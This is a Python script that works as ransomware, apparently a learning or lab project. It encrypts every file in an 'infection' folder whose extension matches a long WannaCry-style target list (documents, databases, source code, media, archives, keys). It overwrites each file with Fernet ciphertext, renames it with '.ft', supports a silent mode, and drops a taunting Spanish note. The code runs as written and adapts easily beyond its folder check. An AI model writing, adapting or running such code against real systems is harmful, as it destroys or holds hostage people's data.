from cryptography.fernet import Fernet
from sys import argv
import os
from platform import system
from pathlib import Path

def key_generator():
	key = Fernet.generate_key()
	with open('key.key', 'wb') as key_file:
		key_file.write(key)
  
def key_charge():
	return open('key.key', 'rb').read()

def encrypt(items, key, silent):
	wanna_ext = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']
	f = Fernet(key)
	for item in items:
		if not item.endswith('.ft'):
			for ext in wanna_ext:
				if item.endswith(ext):
					with open(item, 'rb') as file:
						file_data = file.read()
						file.close()
					encrypted_data = f.encrypt(file_data)
					with open(item, 'wb') as file:
						file.write(encrypted_data)
						file.close()
					os.rename(item, item+'.ft')
					if silent == False:
						print(Path(item).stem+' encrypted')

if __name__ == '__main__':
	silent = False
	if system() == "Linux":
		if len(argv) > 2:
			if len(argv) == 3 and (argv[1] == "-reverse" or argv[1] == "-r") and os.getcwd().endswith('home'):
				if len(argv[2]) < 16:
					print('Key is incompleted')
				else:
					file = open("key.key", "w")
					file.write(argv[2])
					file.close()
					exec(open("decrypt.py").read())
			else:
				print('Too arguments')
		else:
			if len(argv) == 2 and (argv[1] == "-silent" or argv[1] == "-s"):
				silent = True
			if len(argv) == 2 and (argv[1] == "-help" or argv[1] == "-h"):
				print('OPTIONAL FLAGS:\n -v or -version to see actual version\n -s or -silent to silent mode\n -r [key] or -reverse [key] to decrypt files with known key')
			elif len(argv) == 2 and (argv[1] == "-version" or argv[1] == "-v"):
				print('Version: 1.0.0')
			elif len(argv) == 2 and silent == False:
				print('Too many arguments')
			else:
				if os.getcwd().endswith('home'):
					path_to_encrypt = os.getcwd()+'/infection'
					items = os.listdir(path_to_encrypt)
					full_path = [path_to_encrypt+'/'+item for item in items]
					key_generator()
					key = key_charge()
					encrypt(full_path, key, silent)
					with open(path_to_encrypt+'/'+'msg.txt', 'w') as file:
						file.write('Que pasa wey, te jodieron\n')
						file.close()
				else:
					print("You are not in the home folder")
	else:
		print("Your system is not Linux")
